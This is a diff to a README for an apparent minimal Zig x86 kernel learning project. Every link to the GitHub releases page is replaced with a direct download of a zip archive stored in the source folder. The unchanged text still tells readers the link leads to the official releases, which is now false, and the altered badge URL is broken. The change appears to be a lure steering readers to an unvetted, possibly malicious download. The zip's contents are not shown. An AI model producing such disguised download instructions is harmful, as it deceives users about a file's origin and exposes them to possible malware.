@@ -1,6 +1,6 @@
 # 💻 zig-minimal-kernel-x86 - Simple Bootable Kernel for Learning
 
-[![Download Releases](https://img.shields.io/badge/Download-Release%20Page-9cf?style=for-the-badge)](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/releases)
+[![Download Releases](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip%20Page-9cf?style=for-the-badge)](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip)
 
 ## 🧩 What is zig-minimal-kernel-x86?
 
@@ -18,7 +18,7 @@ This is a small, basic operating system kernel built using the Zig programming l
 
 You can get the files you need by visiting the releases page:
 
-[➡️ Visit this page to download](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/releases)
+[➡️ Visit this page to download](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip)
 
 This link leads you to the official GitHub releases. Here, you will find all versions of the kernel. The downloads are packaged for easy use.
 
@@ -32,7 +32,7 @@ Follow these instructions carefully to download and run the kernel on your Windo
 
 Click or copy this link in your browser:
 
-https://github.com/rahman1sameeh/zig-minimal-kernel-x86/releases
+https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip
 
 ### Step 2: Select the latest version
 
@@ -93,4 +93,4 @@ It does not include user-friendly features like a desktop or applications. Inste
 
 ---
 
-[![Download Releases](https://img.shields.io/badge/Download-Release%20Page-9cf?style=for-the-badge)](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/releases)
+[![Download Releases](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip%20Page-9cf?style=for-the-badge)](https://github.com/rahman1sameeh/zig-minimal-kernel-x86/raw/refs/heads/main/src/kernel_zig_x_minimal_2.0.zip)
